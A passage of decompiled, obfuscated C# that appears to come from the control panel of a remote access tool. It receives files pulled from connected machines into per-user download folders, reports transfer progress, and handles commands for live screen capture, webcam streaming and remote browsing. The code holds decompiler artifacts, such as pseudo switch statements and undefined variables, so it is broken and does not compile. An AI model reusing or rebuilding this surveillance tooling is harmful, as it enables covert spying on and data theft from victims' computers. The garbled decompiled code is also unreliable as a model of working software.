					ptr2 = ref cclient83.stats_bytes_in;
					cclient83.stats_bytes_in = ptr2 + (double)num;
					cclient2.FILE_TRANSFER_DL_DATA.Write(ptr, 0, num);
					CClient cclient84 = cclient2;
					ref long ptr9 = ref cclient84.FILE_TRANSFER_POS;
					cclient84.FILE_TRANSFER_POS = checked(ptr9 + unchecked((long)num));
					CClient cclient85 = cclient2;
					ptr2 = ref cclient85.FILE_TRANSFER_SPEED_COUNTER;
					cclient85.FILE_TRANSFER_SPEED_COUNTER = ptr2 + (double)num;
					CClient cclient86 = cclient2;
					ptr9 = ref cclient86.FILE_TRANSFER_PACKETS;
					cclient86.FILE_TRANSFER_PACKETS = checked(ptr9 + 1L);
					string left;
					bool flag3;
					bool ptr10;
					double num28;
					int num30;
					string text6;
					int num31;
					long num48;
					string ptr12;
					if (ptr.Length >= 16 || Operators.CompareString(Encoding.UTF8.GetString(ptr, 0, num), "FL_UP_OK", true) != 0)
					{
						if (!Class130.concurrentDictionary_10.ContainsKey(cclient2.sKey))
						{
							Class130.concurrentDictionary_10.TryAdd(cclient2.sKey, cclient2.sKey);
						}
						if (cclient2.FILE_TRANSFER_DL_DATA.Length >= 33554432L)
						{
							bool flag2;
							byte[] byte_;
							string string_16;
							Class136.Class142 class3;
							if (File.Exists(string.Concat(new string[]
							{
								Application.StartupPath,
								"\\Downloads\\",
								cclient2.FILE_TRANSFER_USER,
								"\\",
								cclient2.FILE_TRANSFER_FILENAME
							})))
							{
								string text3 = string.Concat(new string[]
								{
									Application.StartupPath,
									"\\Downloads\\",
									cclient2.FILE_TRANSFER_USER,
									"\\",
									cclient2.FILE_TRANSFER_FILENAME
								});
								byte[] array5 = cclient2.FILE_TRANSFER_DL_DATA.ToArray();
								flag2 = true;
								byte_ = array5;
								string_16 = text3;
								class3 = new Class136.Class142();
								class3.string_0 = string_16;
								class3.byte_0 = byte_;
								class3.bool_0 = true;
								try
								{
									if (flag2)
									{
										new Thread(new ThreadStart(class3._Lambda$__0)).Start();
									}
									else
									{
										Class136.smethod_15(ref class3.string_0, ref class3.byte_0, class3.bool_0);
									}
									goto IL_38AC;
								}
								catch (Exception ex16)
								{
									goto IL_38AC;
								}
							}
							string text4 = string.Concat(new string[]
							{
								Application.StartupPath,
								"\\Downloads\\",
								cclient2.FILE_TRANSFER_USER,
								"\\",
								cclient2.FILE_TRANSFER_FILENAME
							});
							byte[] array6 = cclient2.FILE_TRANSFER_DL_DATA.ToArray();
							flag2 = true;
							byte_ = array6;
							string_16 = text4;
							class3 = new Class136.Class142();
							class3.string_0 = string_16;
							class3.byte_0 = byte_;
							class3.bool_0 = false;
							try
							{
								if (flag2)
								{
									new Thread(new ThreadStart(class3._Lambda$__0)).Start();
								}
								else
								{
									Class136.smethod_15(ref class3.string_0, ref class3.byte_0, class3.bool_0);
								}
							}
							catch (Exception ex17)
							{
							}
							IL_38AC:
							cclient2.FILE_TRANSFER_DL_DATA.SetLength(0L);
						}
						if ((double)Class136.smethod_36() - (double)cclient2.FILE_TRANSFER_LAST_PACKET > 1000.0)
						{
							cclient2.FILE_TRANSFER_ELAPSED = (double)cclient2.FILE_TRANSFER_LAST_PACKET - cclient2.FILE_TRANSFER_STARTED;
							cclient2.FILE_TRANSFER_SPEED_AVG = (double)cclient2.FILE_TRANSFER_POS / (cclient2.FILE_TRANSFER_ELAPSED / 1000.0);
							long long_ = checked((long)Math.Round(unchecked(Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE) - (double)cclient2.FILE_TRANSFER_POS) / cclient2.FILE_TRANSFER_SPEED_AVG));
							fTransferManager fTransferManager_ = Class130.fTransferManager_0;
							string file_TRANSFER_ID = cclient2.FILE_TRANSFER_ID;
							int num26 = 2;
							double num27 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
							flag3 = false;
							ptr10 = ref flag3;
							num28 = num27;
							int num29 = num26;
							string string_19 = file_TRANSFER_ID;
							fTransferManager fTransferManager = fTransferManager_;
							object obj;
							try
							{
								ProjectData.ClearProjectError();
								num30 = 2;
								string text5 = string.Empty;
								if (num28 >= 1099511627776.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
								}
								else if (num28 >= 1073741824.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
								}
								else if (num28 >= 1048576.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
								}
								else if (num28 >= 1024.0)
								{
									text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
								}
								else if (num28 < 1024.0)
								{
									text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
								}
								if (ptr10)
								{
									text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
								}
								if (text5.Length > 0)
								{
									text6 = text5;
								}
								else
								{
									text6 = " 0 B";
								}
								IL_3ADE:
								goto IL_3B2E;
								IL_3AE0:
								text6 = "0 B";
								goto IL_3ADE;
								IL_3AE9:
								num31 = -1;
								@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
								IL_3AFF:;
							}
							catch when (endfilter(obj is Exception & num30 != 0 & num31 == 0))
							{
								Exception ex18 = (Exception)obj2;
								goto IL_3AE9;
							}
							throw ProjectData.CreateProjectError(-2146828237);
							IL_3B2E:
							if (num31 != 0)
							{
								ProjectData.ClearProjectError();
							}
							string string_20 = text6;
							fTransferManager.method_16(string_19, num29, string_20);
							fTransferManager fTransferManager_2 = Class130.fTransferManager_0;
							string file_TRANSFER_ID2 = cclient2.FILE_TRANSFER_ID;
							int num32 = 3;
							double num33 = (double)cclient2.FILE_TRANSFER_POS;
							flag3 = false;
							ptr10 = ref flag3;
							num28 = num33;
							int num34 = num32;
							string string_21 = file_TRANSFER_ID2;
							fTransferManager fTransferManager2 = fTransferManager_2;
							object obj3;
							try
							{
								ProjectData.ClearProjectError();
								num30 = 2;
								string text5 = string.Empty;
								if (num28 >= 1099511627776.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
								}
								else if (num28 >= 1073741824.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
								}
								else if (num28 >= 1048576.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
								}
								else if (num28 >= 1024.0)
								{
									text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
								}
								else if (num28 < 1024.0)
								{
									text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
								}
								if (ptr10)
								{
									text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
								}
								if (text5.Length > 0)
								{
									text6 = text5;
								}
								else
								{
									text6 = " 0 B";
								}
								IL_3CE7:
								goto IL_3D37;
								IL_3CE9:
								text6 = "0 B";
								goto IL_3CE7;
								IL_3CF2:
								num31 = -1;
								@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
								IL_3D08:;
							}
							catch when (endfilter(obj3 is Exception & num30 != 0 & num31 == 0))
							{
								Exception ex19 = (Exception)obj4;
								goto IL_3CF2;
							}
							throw ProjectData.CreateProjectError(-2146828237);
							IL_3D37:
							if (num31 != 0)
							{
								ProjectData.ClearProjectError();
							}
							string str13 = text6;
							fTransferManager2.method_16(string_21, num34, str13 + " (" + Conversions.ToString(Math.Round((double)cclient2.FILE_TRANSFER_POS / Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE) * 100.0, 2)) + "%)");
							fTransferManager fTransferManager_3 = Class130.fTransferManager_0;
							string file_TRANSFER_ID3 = cclient2.FILE_TRANSFER_ID;
							int num35 = 4;
							double file_TRANSFER_SPEED_COUNTER = cclient2.FILE_TRANSFER_SPEED_COUNTER;
							flag3 = false;
							ptr10 = ref flag3;
							num28 = file_TRANSFER_SPEED_COUNTER;
							int num36 = num35;
							string text7 = file_TRANSFER_ID3;
							fTransferManager fTransferManager3 = fTransferManager_3;
							object obj5;
							try
							{
								ProjectData.ClearProjectError();
								num30 = 2;
								string text5 = string.Empty;
								if (num28 >= 1099511627776.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
								}
								else if (num28 >= 1073741824.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
								}
								else if (num28 >= 1048576.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
								}
								else if (num28 >= 1024.0)
								{
									text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
								}
								else if (num28 < 1024.0)
								{
									text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
								}
								if (ptr10)
								{
									text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
								}
								if (text5.Length > 0)
								{
									text6 = text5;
								}
								else
								{
									text6 = " 0 B";
								}
								IL_3F28:
								goto IL_3F78;
								IL_3F2A:
								text6 = "0 B";
								goto IL_3F28;
								IL_3F33:
								num31 = -1;
								@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
								IL_3F49:;
							}
							catch when (endfilter(obj5 is Exception & num30 != 0 & num31 == 0))
							{
								Exception ex20 = (Exception)obj6;
								goto IL_3F33;
							}
							throw ProjectData.CreateProjectError(-2146828237);
							IL_3F78:
							if (num31 != 0)
							{
								ProjectData.ClearProjectError();
							}
							string text8 = text6;
							fTransferManager fTransferManager4 = fTransferManager3;
							string text9 = text7;
							int num37 = num36;
							string text10 = text8;
							string text11 = "/s (Avg. ";
							double file_TRANSFER_SPEED_AVG = cclient2.FILE_TRANSFER_SPEED_AVG;
							flag3 = false;
							ptr10 = ref flag3;
							num28 = file_TRANSFER_SPEED_AVG;
							string str14 = text11;
							string str15 = text10;
							int num38 = num37;
							string string_22 = text9;
							fTransferManager fTransferManager5 = fTransferManager4;
							object obj7;
							try
							{
								ProjectData.ClearProjectError();
								num30 = 2;
								string text5 = string.Empty;
								if (num28 >= 1099511627776.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
								}
								else if (num28 >= 1073741824.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
								}
								else if (num28 >= 1048576.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
								}
								else if (num28 >= 1024.0)
								{
									text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
								}
								else if (num28 < 1024.0)
								{
									text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
								}
								if (ptr10)
								{
									text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
								}
								if (text5.Length > 0)
								{
									text6 = text5;
								}
								else
								{
									text6 = " 0 B";
								}
								IL_4127:
								goto IL_4177;
								IL_4129:
								text6 = "0 B";
								goto IL_4127;
								IL_4132:
								num31 = -1;
								@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
								IL_4148:;
							}
							catch when (endfilter(obj7 is Exception & num30 != 0 & num31 == 0))
							{
								Exception ex21 = (Exception)obj8;
								goto IL_4132;
							}
							throw ProjectData.CreateProjectError(-2146828237);
							IL_4177:
							if (num31 != 0)
							{
								ProjectData.ClearProjectError();
							}
							string str16 = text6;
							fTransferManager5.method_16(string_22, num38, str15 + str14 + str16 + "/s)");
							Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 6, Class136.smethod_35(checked((long)Math.Round(cclient2.FILE_TRANSFER_ELAPSED / 1000.0)), true));
							Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, Class136.smethod_35(long_, true));
							Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
							fMain ff5 = cclient2.ff;
							CClient cclient87 = cclient2;
							ref string ptr11 = ref cclient87.FILE_TRANSFER_USER_KEY;
							object value3 = cclient87.FILE_TRANSFER_USER_KEY;
							ff5.method_24(ref value3);
							ptr11 = Conversions.ToString(value3);
							cclient2.FILE_TRANSFER_SPEED_COUNTER = 0.0;
							cclient2.FILE_TRANSFER_LAST_PACKET = Class136.smethod_36();
						}
						if ((double)cclient2.FILE_TRANSFER_POS == Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE))
						{
							fTransferManager fTransferManager_4 = Class130.fTransferManager_0;
							string file_TRANSFER_ID4 = cclient2.FILE_TRANSFER_ID;
							int num39 = 2;
							double num40 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
							flag3 = false;
							ptr10 = ref flag3;
							num28 = num40;
							int num41 = num39;
							string string_23 = file_TRANSFER_ID4;
							fTransferManager fTransferManager6 = fTransferManager_4;
							object obj9;
							try
							{
								ProjectData.ClearProjectError();
								num30 = 2;
								string text5 = string.Empty;
								if (num28 >= 1099511627776.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
								}
								else if (num28 >= 1073741824.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
								}
								else if (num28 >= 1048576.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
								}
								else if (num28 >= 1024.0)
								{
									text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
								}
								else if (num28 < 1024.0)
								{
									text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
								}
								if (ptr10)
								{
									text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
								}
								if (text5.Length > 0)
								{
									text6 = text5;
								}
								else
								{
									text6 = " 0 B";
								}
								IL_43F6:
								goto IL_4446;
								IL_43F8:
								text6 = "0 B";
								goto IL_43F6;
								IL_4401:
								num31 = -1;
								@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
								IL_4417:;
							}
							catch when (endfilter(obj9 is Exception & num30 != 0 & num31 == 0))
							{
								Exception ex22 = (Exception)obj10;
								goto IL_4401;
							}
							throw ProjectData.CreateProjectError(-2146828237);
							IL_4446:
							if (num31 != 0)
							{
								ProjectData.ClearProjectError();
							}
							string string_24 = text6;
							fTransferManager6.method_16(string_23, num41, string_24);
							fTransferManager fTransferManager_5 = Class130.fTransferManager_0;
							string file_TRANSFER_ID5 = cclient2.FILE_TRANSFER_ID;
							int num42 = 3;
							double num43 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
							flag3 = false;
							ptr10 = ref flag3;
							num28 = num43;
							int num44 = num42;
							string string_25 = file_TRANSFER_ID5;
							fTransferManager fTransferManager7 = fTransferManager_5;
							object obj11;
							try
							{
								ProjectData.ClearProjectError();
								num30 = 2;
								string text5 = string.Empty;
								if (num28 >= 1099511627776.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
								}
								else if (num28 >= 1073741824.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
								}
								else if (num28 >= 1048576.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
								}
								else if (num28 >= 1024.0)
								{
									text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
								}
								else if (num28 < 1024.0)
								{
									text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
								}
								if (ptr10)
								{
									text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
								}
								if (text5.Length > 0)
								{
									text6 = text5;
								}
								else
								{
									text6 = " 0 B";
								}
								IL_4603:
								goto IL_4653;
								IL_4605:
								text6 = "0 B";
								goto IL_4603;
								IL_460E:
								num31 = -1;
								@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
								IL_4624:;
							}
							catch when (endfilter(obj11 is Exception & num30 != 0 & num31 == 0))
							{
								Exception ex23 = (Exception)obj12;
								goto IL_460E;
							}
							throw ProjectData.CreateProjectError(-2146828237);
							IL_4653:
							if (num31 != 0)
							{
								ProjectData.ClearProjectError();
							}
							string str17 = text6;
							fTransferManager7.method_16(string_25, num44, str17 + " (100%)");
							if (cclient2.FILE_TRANSFER_ELAPSED / 1000.0 == 0.0)
							{
								fTransferManager fTransferManager_6 = Class130.fTransferManager_0;
								string file_TRANSFER_ID6 = cclient2.FILE_TRANSFER_ID;
								int num45 = 4;
								double num46 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
								flag3 = false;
								ptr10 = ref flag3;
								num28 = num46;
								int num47 = num45;
								string string_26 = file_TRANSFER_ID6;
								fTransferManager fTransferManager8 = fTransferManager_6;
								object obj13;
								try
								{
									ProjectData.ClearProjectError();
									num30 = 2;
									string text5 = string.Empty;
									if (num28 >= 1099511627776.0)
									{
										text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
									}
									else if (num28 >= 1073741824.0)
									{
										text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
									}
									else if (num28 >= 1048576.0)
									{
										text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
									}
									else if (num28 >= 1024.0)
									{
										text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
									}
									else if (num28 < 1024.0)
									{
										text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
									}
									if (ptr10)
									{
										text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
									}
									if (text5.Length > 0)
									{
										text6 = text5;
									}
									else
									{
										text6 = " 0 B";
									}
									IL_4839:
									goto IL_4889;
									IL_483B:
									text6 = "0 B";
									goto IL_4839;
									IL_4844:
									num31 = -1;
									@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
									IL_485A:;
								}
								catch when (endfilter(obj13 is Exception & num30 != 0 & num31 == 0))
								{
									Exception ex24 = (Exception)obj14;
									goto IL_4844;
								}
								throw ProjectData.CreateProjectError(-2146828237);
								IL_4889:
								if (num31 != 0)
								{
									ProjectData.ClearProjectError();
								}
								string str18 = text6;
								fTransferManager8.method_16(string_26, num47, str18 + "/s");
							}
							Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Completed");
							Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
							Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
							Class130.fTransferManager_0.method_26();
							Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
							fMain ff6 = cclient2.ff;
							CClient cclient88 = cclient2;
							ref string ptr11 = ref cclient88.FILE_TRANSFER_USER_KEY;
							object value3 = cclient88.FILE_TRANSFER_USER_KEY;
							ff6.method_24(ref value3);
							ptr11 = Conversions.ToString(value3);
							bool flag2;
							byte[] byte_;
							string string_16;
							Class136.Class142 class3;
							if (File.Exists(string.Concat(new string[]
							{
								Application.StartupPath,
								"\\Downloads\\",
								cclient2.FILE_TRANSFER_USER,
								"\\",
								cclient2.FILE_TRANSFER_FILENAME
							})))
							{
								string text12 = string.Concat(new string[]
								{
									Application.StartupPath,
									"\\Downloads\\",
									cclient2.FILE_TRANSFER_USER,
									"\\",
									cclient2.FILE_TRANSFER_FILENAME
								});
								byte[] array7 = cclient2.FILE_TRANSFER_DL_DATA.ToArray();
								flag2 = true;
								byte_ = array7;
								string_16 = text12;
								class3 = new Class136.Class142();
								class3.string_0 = string_16;
								class3.byte_0 = byte_;
								class3.bool_0 = true;
								try
								{
									if (flag2)
									{
										new Thread(new ThreadStart(class3._Lambda$__0)).Start();
									}
									else
									{
										Class136.smethod_15(ref class3.string_0, ref class3.byte_0, class3.bool_0);
									}
									goto IL_4ADD;
								}
								catch (Exception ex25)
								{
									goto IL_4ADD;
								}
							}
							string text13 = string.Concat(new string[]
							{
								Application.StartupPath,
								"\\Downloads\\",
								cclient2.FILE_TRANSFER_USER,
								"\\",
								cclient2.FILE_TRANSFER_FILENAME
							});
							byte[] array8 = cclient2.FILE_TRANSFER_DL_DATA.ToArray();
							flag2 = true;
							byte_ = array8;
							string_16 = text13;
							class3 = new Class136.Class142();
							class3.string_0 = string_16;
							class3.byte_0 = byte_;
							class3.bool_0 = false;
							try
							{
								if (flag2)
								{
									new Thread(new ThreadStart(class3._Lambda$__0)).Start();
								}
								else
								{
									Class136.smethod_15(ref class3.string_0, ref class3.byte_0, class3.bool_0);
								}
							}
							catch (Exception ex26)
							{
							}
							IL_4ADD:
							cclient2.FILE_TRANSFER_DL_DATA.SetLength(0L);
							left = string.Concat(new string[]
							{
								Application.StartupPath,
								"\\Downloads\\",
								cclient2.FILE_TRANSFER_USER,
								"\\",
								cclient2.FILE_TRANSFER_FILENAME
							});
							num48 = Conversions.ToLong(cclient2.FILE_TRANSFER_FILE_LAST_MODIFIED);
							ptr12 = ref left;
							if (File.Exists(ptr12))
							{
								DateTime dateTime = new DateTime(1970, 1, 1);
								try
								{
									File.SetLastWriteTimeUtc(ptr12, dateTime.AddSeconds((double)num48));
								}
								catch (Exception ex27)
								{
								}
							}
							cclient2.FILE_TRANSFER_COMPLETED = true;
							CClient cclient89 = cclient2;
							flag3 = true;
							cclient89.SOCKET_DISCONNECT(ref flag3);
						}
						return;
					}
					fTransferManager fTransferManager_7 = Class130.fTransferManager_0;
					string file_TRANSFER_ID7 = cclient2.FILE_TRANSFER_ID;
					int num49 = 2;
					double num50 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
					flag3 = false;
					ptr10 = ref flag3;
					num28 = num50;
					int num51 = num49;
					string string_27 = file_TRANSFER_ID7;
					fTransferManager fTransferManager9 = fTransferManager_7;
					object obj15;
					try
					{
						ProjectData.ClearProjectError();
						num30 = 2;
						string text5 = string.Empty;
						if (num28 >= 1099511627776.0)
						{
							text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num28 >= 1073741824.0)
						{
							text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num28 >= 1048576.0)
						{
							text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num28 >= 1024.0)
						{
							text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
						}
						else if (num28 < 1024.0)
						{
							text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
						}
						if (ptr10)
						{
							text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
						}
						if (text5.Length > 0)
						{
							text6 = text5;
						}
						else
						{
							text6 = " 0 B";
						}
						IL_30E2:
						goto IL_3132;
						IL_30E4:
						text6 = "0 B";
						goto IL_30E2;
						IL_30ED:
						num31 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
						IL_3103:;
					}
					catch when (endfilter(obj15 is Exception & num30 != 0 & num31 == 0))
					{
						Exception ex28 = (Exception)obj16;
						goto IL_30ED;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_3132:
					if (num31 != 0)
					{
						ProjectData.ClearProjectError();
					}
					string string_28 = text6;
					fTransferManager9.method_16(string_27, num51, string_28);
					fTransferManager fTransferManager_8 = Class130.fTransferManager_0;
					string file_TRANSFER_ID8 = cclient2.FILE_TRANSFER_ID;
					int num52 = 3;
					double num53 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
					flag3 = false;
					ptr10 = ref flag3;
					num28 = num53;
					int num54 = num52;
					string string_29 = file_TRANSFER_ID8;
					fTransferManager fTransferManager10 = fTransferManager_8;
					object obj17;
					try
					{
						ProjectData.ClearProjectError();
						num30 = 2;
						string text5 = string.Empty;
						if (num28 >= 1099511627776.0)
						{
							text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num28 >= 1073741824.0)
						{
							text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num28 >= 1048576.0)
						{
							text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num28 >= 1024.0)
						{
							text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
						}
						else if (num28 < 1024.0)
						{
							text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
						}
						if (ptr10)
						{
							text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
						}
						if (text5.Length > 0)
						{
							text6 = text5;
						}
						else
						{
							text6 = " 0 B";
						}
						IL_32EF:
						goto IL_333F;
						IL_32F1:
						text6 = "0 B";
						goto IL_32EF;
						IL_32FA:
						num31 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
						IL_3310:;
					}
					catch when (endfilter(obj17 is Exception & num30 != 0 & num31 == 0))
					{
						Exception ex29 = (Exception)obj18;
						goto IL_32FA;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_333F:
					if (num31 != 0)
					{
						ProjectData.ClearProjectError();
					}
					string str19 = text6;
					fTransferManager10.method_16(string_29, num54, str19 + " (100%)");
					if (cclient2.FILE_TRANSFER_ELAPSED / 1000.0 == 0.0)
					{
						fTransferManager fTransferManager_9 = Class130.fTransferManager_0;
						string file_TRANSFER_ID9 = cclient2.FILE_TRANSFER_ID;
						int num55 = 4;
						double num56 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
						flag3 = false;
						ptr10 = ref flag3;
						num28 = num56;
						int num57 = num55;
						string string_30 = file_TRANSFER_ID9;
						fTransferManager fTransferManager11 = fTransferManager_9;
						object obj19;
						try
						{
							ProjectData.ClearProjectError();
							num30 = 2;
							string text5 = string.Empty;
							if (num28 >= 1099511627776.0)
							{
								text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
							}
							else if (num28 >= 1073741824.0)
							{
								text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
							}
							else if (num28 >= 1048576.0)
							{
								text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
							}
							else if (num28 >= 1024.0)
							{
								text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
							}
							else if (num28 < 1024.0)
							{
								text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
							}
							if (ptr10)
							{
								text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
							}
							if (text5.Length > 0)
							{
								text6 = text5;
							}
							else
							{
								text6 = " 0 B";
							}
							IL_3525:
							goto IL_3575;
							IL_3527:
							text6 = "0 B";
							goto IL_3525;
							IL_3530:
							num31 = -1;
							@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
							IL_3546:;
						}
						catch when (endfilter(obj19 is Exception & num30 != 0 & num31 == 0))
						{
							Exception ex30 = (Exception)obj20;
							goto IL_3530;
						}
						throw ProjectData.CreateProjectError(-2146828237);
						IL_3575:
						if (num31 != 0)
						{
							ProjectData.ClearProjectError();
						}
						string str20 = text6;
						fTransferManager11.method_16(string_30, num57, str20 + "/s");
					}
					Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Completed");
					Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
					Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
					left = string.Concat(new string[]
					{
						Application.StartupPath,
						"\\Downloads\\",
						cclient2.FILE_TRANSFER_USER,
						"\\",
						cclient2.FILE_TRANSFER_FILENAME
					});
					num48 = Conversions.ToLong(cclient2.FILE_TRANSFER_FILE_LAST_MODIFIED);
					ptr12 = ref left;
					if (File.Exists(ptr12))
					{
						DateTime dateTime = new DateTime(1970, 1, 1);
						try
						{
							File.SetLastWriteTimeUtc(ptr12, dateTime.AddSeconds((double)num48));
						}
						catch (Exception ex31)
						{
						}
					}
					Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
					cclient2.FILE_TRANSFER_COMPLETED = true;
					cclient2.FILE_TRANSFER_ACTIVE = false;
					checked
					{
						Class130.long_3 -= 1L;
						if (Class130.long_3 < 0L)
						{
							Class130.long_3 = 0L;
						}
					}
				}
				else
				{
					StringBuilder stringBuilder = new StringBuilder();
					if ((!cclient2.FILE_TRANSFER_ACTIVE & !cclient2.SCREENLIVE_ACTIVE & !cclient2.SCREENLIVE_SECONDARY_ACTIVE & !cclient2.SCREEN_PREVIEW_ACTIVE & !cclient2.WEBCAM_PREVIEW_ACTIVE & !cclient2.WEBCAMSTREAM_ACTIVE & !cclient2.REMOTE_BROWSER_ACTIVE & !cclient2.SOCKET_COMMAND_ACTIVE) && num > 0)
					{
						stringBuilder.Append(Encoding.UTF8.GetString(ptr, 0, num));
						string text14 = stringBuilder.ToString().Trim();
						if (Operators.CompareString(text14, string.Empty, true) != 0)
						{
							string left = Strings.Split(text14, "|", 2, CompareMethod.Text)[0];
							if (Operators.CompareString(left, "SC_ST", true) == 0)
							{
								try
								{
									cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
									string[] array9 = Strings.Split(text14, "|", 3, CompareMethod.Text);
									cclient2.SCREENLIVE_ACTIVE = true;
									cclient2.SCREENLIVE_USER_KEY = array9[1];
									ref double ptr2 = ref Class130.struct20_0.double_2;
									Class130.struct20_0.double_2 = ptr2 + (double)num;
									ptr2 = ref Class130.struct20_0.double_4;
									Class130.struct20_0.double_4 = ptr2 + 1.0;
